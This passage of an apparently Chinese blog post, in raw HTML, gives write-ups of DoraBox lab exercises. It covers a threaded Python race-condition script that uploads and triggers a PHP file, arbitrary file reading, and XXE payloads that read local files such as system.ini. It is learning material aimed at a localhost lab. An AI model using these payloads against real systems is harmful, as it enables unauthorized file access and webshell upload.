&lt;span class=&#34;title&#34;&gt;_init_&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self&lt;/span&gt;):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        threading.Thread._init_(self)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.url = &lt;span class=&#34;string&#34;&gt;&amp;#x27;http://localhost/dorabox/race_condition/key.php&amp;#x27;&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;# 马&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.uploadUrl = &lt;span class=&#34;string&#34;&gt;&amp;#x27;http://localhost/dorabox/race_condition/upload.php&amp;#x27;&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;# 搞它&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# 获取上传的马，就是解析执行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;_get&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self&lt;/span&gt;):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;try to call uploaded file...&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        r = requests.get(self.url)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; r.status_code == &lt;span class=&#34;number&#34;&gt;200&lt;/span&gt;: &lt;span class=&#34;comment&#34;&gt;# 搞到成功就退出&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;create file info.php success.&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            os._exit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# 传马&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;_upload&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self&lt;/span&gt;):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload file...&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        file = &amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;#x27;myfile&amp;#x27;&lt;/span&gt; : &lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;attack.php&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;r&amp;#x27;&lt;/span&gt;)&amp;#125; &lt;span class=&#34;comment&#34;&gt;#key value的数据，我还以为是啥&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        requests.post(self.uploadUrl, files=file)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# 一直搞&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;run&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self&lt;/span&gt;):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;):  &lt;span class=&#34;comment&#34;&gt;# 其实就外面那个循环不就好了，为啥还要再写一个for啊&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                self._upload()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                self._get()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span class=&#34;string&#34;&gt;&amp;#x27;__main__&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    threads = &lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(threads):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        t = RaceCondition()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        t.start()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(threads):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# join的原理就是依次检验线程池中的线程是否结束，没有结束就阻塞直到线程结束，如果结束则跳转执行下一个线程的join函数。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        t.join() &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_jz_upload002.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-20&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-20&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;python 的 self 竟然不是关键字？？？是因为__init__(self) 的时候创建了一个该类的实例，且名字叫 self，所以换成别的字符串，在别的函数里也能用把。&lt;/p&gt;
&lt;p&gt;python 类变量，它的值将在这个类的所有实例之间共享。（还有在_&lt;em&gt;init&lt;/em&gt;_() 的时候 self. 变量，这和 java 区别还蛮大的）&lt;/p&gt;
&lt;p&gt;心得就是解题思路真的很重要，因为菜，都没见过，无从下手的感觉太难受了，是不是题目写多了就会有很多思路？希望不要写多了题目思维反而被局限了，还是要多思考。&lt;/p&gt;
&lt;p&gt;最后，这道题真的好帅啊！！！&lt;/p&gt;
&lt;h1 id=&#34;任意文件读取&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#任意文件读取&#34;&gt;#&lt;/a&gt; 任意文件读取&lt;/h1&gt;
&lt;p&gt;输入…/，发现是可以直接读文件的&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_readanyfile002.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;过程-21&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-21&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;直接读取文件&lt;img src=&#34;dorabox_readanyfile001.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结-21&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-21&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;这个，emmmm，这样的漏洞，很难找把？（傻喵）&lt;/p&gt;
&lt;h1 id=&#34;xxe&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xxe&#34;&gt;#&lt;/a&gt; xxe&lt;/h1&gt;
&lt;p&gt;靶场 php 和 xml 交互的时候报错了，百度没找到解决方案，我太菜了（现在也很菜喔～我们回家摆小摊把 o (￣ε￣*)）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_xxe001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;过程-22&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-22&#34;&gt;#&lt;/a&gt; 过程：&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;看前端代码，观察到服务端以 xml 的形式接收文件，然后服务器会正常返回客户端在 body 中 post 过去的 xml 代码执行结果&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;dorabox_xxe002.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;构造 xml 文件读取 attack.php&lt;/p&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;meta-keyword&#34;&gt;Sakura&lt;/span&gt; [&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ENTITY a &lt;span class=&#34;meta-keyword&#34;&gt;SYSTEM&lt;/span&gt;  &lt;span class=&#34;meta-string&#34;&gt;&amp;quot;file:///C:/Users/lenovo/Desktop/attack.php&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;]&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;user&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;username&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;&amp;amp;a;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;username&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;password&lt;/span&gt;&amp;gt;&lt;/span&gt;桜桜私はあなたを愛しています&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;password&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;user&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结-22&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-22&#34;&gt;#&lt;/a&gt; 总结：&lt;/h2&gt;
&lt;p&gt;xxe 就是外部实体注入嘛，可以一行代码禁用。&lt;/p&gt;
&lt;p&gt;xxe 是由 xml 和 dtd 约束搞出来的东西，我们可以通过文件路径和变量名，回显数据。&lt;/p&gt;
&lt;p&gt;1、 当引用的 DTD 文件是&lt;strong&gt;本地文件&lt;/strong&gt;的时候，用 SYSTEM 标识，并写上”DTD 的文件路径”，如下：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!DOCTYPE 根元素 SYSTEM &amp;quot;DTD文件路径&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;2、 如果引用的 DTD 文件是一个&lt;strong&gt;公共文件&lt;/strong&gt;时，采用 PUBLIC 标识，如下：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!DOCTYPE 根元素 PUBLIC &amp;quot;DTD名称&amp;quot; &amp;quot;DTD文件的URL&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;1. 内部实体声明&lt;/strong&gt;&lt;/p&gt;
&lt;!ENTITY 实体名称 &#34;实体的值&#34;&gt; 
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;meta-keyword&#34;&gt;foo&lt;/span&gt; [&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ELEMENT &lt;span class=&#34;meta-keyword&#34;&gt;foo&lt;/span&gt; &lt;span class=&#34;meta-keyword&#34;&gt;ANY&lt;/span&gt; &amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ENTITY &lt;span class=&#34;meta-keyword&#34;&gt;xxe&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;quot;Thinking&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;]&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;foo&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;foo&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;2. 外部实体声明&lt;/strong&gt;&lt;/p&gt;
&lt;!ENTITY 实体名称 SYSTEM &#34;URI/URL&#34;&gt; 
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;meta-keyword&#34;&gt;copyright&lt;/span&gt; [&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ENTITY &lt;span class=&#34;meta-keyword&#34;&gt;test&lt;/span&gt; &lt;span class=&#34;meta-keyword&#34;&gt;SYSTEM&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;quot;http://www.runoob.com/entities.dtd&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;]&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;reset&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;login&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;&amp;amp;test;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;login&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;secret&lt;/span&gt;&amp;gt;&lt;/span&gt;login&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;secret&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;reset&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上述两种均为引用实体，主要在&lt;strong&gt; XML 文档中&lt;/strong&gt;被应用，引用方式：&lt;strong&gt;&amp;amp; 实体名称；&lt;/strong&gt; 末尾要带上分号，这个引用将直接转变成实体内容。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 参数实体声明&lt;/strong&gt;&lt;/p&gt;
&lt;!ENTITY % 实体名称 &#34;实体的值&#34;&gt; 
&lt;!ENTITY % 实体名称 SYSTEM &#34;URI/URL&#34;&gt; 
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;meta-keyword&#34;&gt;copyright&lt;/span&gt; [&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ENTITY % &lt;span class=&#34;meta-keyword&#34;&gt;body&lt;/span&gt; &lt;span class=&#34;meta-keyword&#34;&gt;SYSTEM&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;quot;http://www.runoob.com/entities.dtd&amp;quot;&lt;/span&gt; &amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ENTITY &lt;span class=&#34;meta-keyword&#34;&gt;xxe&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;quot;%body;&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;]&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;reset&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;secret&lt;/span&gt;&amp;gt;&lt;/span&gt;login&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;secret&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;reset&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;参数实体，被&lt;strong&gt; DTD 文件&lt;/strong&gt;自身使用 ，引用方式为：% 实体名称。和通用实体一样，参数实体也可以外部引用。&lt;/p&gt;
&lt;p&gt;允许&lt;strong&gt;包含外部实体&lt;/strong&gt;，就可能存在 XXE 攻击。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;【利用 1】读取本地文件&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;meta-keyword&#34;&gt;creds&lt;/span&gt; [  &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ENTITY &lt;span class=&#34;meta-keyword&#34;&gt;goodies&lt;/span&gt; &lt;span class=&#34;meta-keyword&#34;&gt;SYSTEM&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;quot;file:///c:/windows/system.ini&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt; ]&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;creds&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;symbol&#34;&gt;&amp;amp;goodies;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;creds&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;【利用 2】读取含特殊字符的本地文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果文件中含有特殊字符，如 &amp;amp;,&amp;lt;,&amp;gt;,&amp;quot;,&#39; 等，通过上述方法会报错，需要借助 CDATA，CDATA 节中的所有字符都会被当做元素字符数据的常量部分，而不是 xml 标记。&lt;/p&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;meta-keyword&#34;&gt;roottag&lt;/span&gt; [&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&lt;span 